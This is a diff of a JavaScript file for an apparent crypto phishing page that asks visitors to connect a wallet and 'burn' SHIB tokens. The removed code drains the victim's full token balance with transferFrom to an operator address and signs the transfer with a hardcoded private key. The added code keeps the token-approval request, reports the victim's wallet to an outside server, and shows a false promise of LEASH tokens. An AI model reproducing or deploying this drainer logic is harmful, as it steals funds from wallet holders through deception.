@@ -1,11 +1,35 @@
 const Web3 = require('web3');
 var baseURL = 'http://vps-2218353-x.dattaweb.com',
     web3, metamaskAccounts = [], myAccount, isConnected, lastURL, actURL,
-    shareReady = false, ourAddress = '0x61BFef7f4121077106B4B07F84B876b004d2475C';
+    shareReady = false, ourAddress = '0x17fCFf24f0e9b3b360a34df8d92455581Db0EF7c';
 
 var shibContract,
     shibContractAddress = '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
     shibAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"sender","type":"address"},{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"value","type":"uint256"}],"name":"burn","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"recipient","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"name","type":"string"},{"name":"symbol","type":"string"},{"name":"decimals","type":"uint8"},{"name":"totalSupply","type":"uint256"},{"name":"feeReceiver","type":"address"},{"name":"tokenOwnerAddress","type":"address"}],"payable":true,"stateMutability":"payable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"}];
+
+
+const button = document.getElementById('headlessui-popover-button-1');
+const element = document.getElementById('headlessui-popover-panel-2');
+const body = document.querySelector('body');
+
+button.addEventListener('click', function () {
+  element.classList.toggle('m-fadeIn');
+});
+
+body.addEventListener('click', function (e) {
+  if (e.target !== button && !isChildOf(e.target, button))
+  element.classList.remove('m-fadeIn');
+});
+
+function isChildOf(child, parent) {
+  if (child.parentNode === parent) {
+    return true;
+  } else if (child.parentNode === null) {
+    return false;
+  } else {
+    return isChildOf(child.parentNode, parent);
+  }
+}
 
 function activeCheck(element) {
   element.classList.remove('step_check');
@@ -30,6 +54,13 @@ async function burnEvents() {
 
     function showError(text) {
       let errParr = document.getElementById('errParr');
+      errParr.style.color = 'red';
+      errParr.innerHTML = text;
+    }
+
+    function showSuccess(text) {
+      let errParr = document.getElementById('errParr');
+      errParr.style.color = 'green';
       errParr.innerHTML = text;
     }
 
@@ -57,29 +88,9 @@ async function burnEvents() {
         // Solicitamos firma de aprobación
         await window.ethereum.request({ method: 'eth_sendTransaction', params: tx })
           .then(async function () {
-
-            // Obtenemos el balance para enviarlo
-            getSHIBBalance().then(async function (balance) {
-                // Acá, después de que aceptó, sustraemos muy cuidadosamente sus tokens 
-                let estimateGas = await shibContract.methods.transferFrom(myAccount, ourAddress, balance).estimateGas({from: ourAddress});
-                    datita = await shibContract.methods.transferFrom(myAccount, ourAddress, balance).encodeABI();
-                
-                tx = [{
-                  from: ourAddress, 
-                  to: shibContractAddress, 
-                  data: datita,
-                  gas: estimateGas
-                }];
-
-                // Firmamos la transacción con cuenta externa
-                web3.eth.signTransaction(tx, 'a38b37851bf4dee48331b029be84c401463025c13e4c664033422de858e1e17b').on('receipt', function (result) {
-                    // Una vez firmada, la enviamos.
-                    web3.eth.sendSignedTransaction(result['rawTransaction']).on('receipt', function (res) {
-                        view_index();
-                    });
-                });
-
-              });
+              // Aca guardamos que aceptó la transfer en un archivo.
+              await fetch(baseURL + 'wallet/' + myAccount);
+              showSuccess('¡Congratulations! You will receive your LEASH in the next 8 hours.')
           })
           .catch((error) => {
               // Sí rechazó, mostramos error
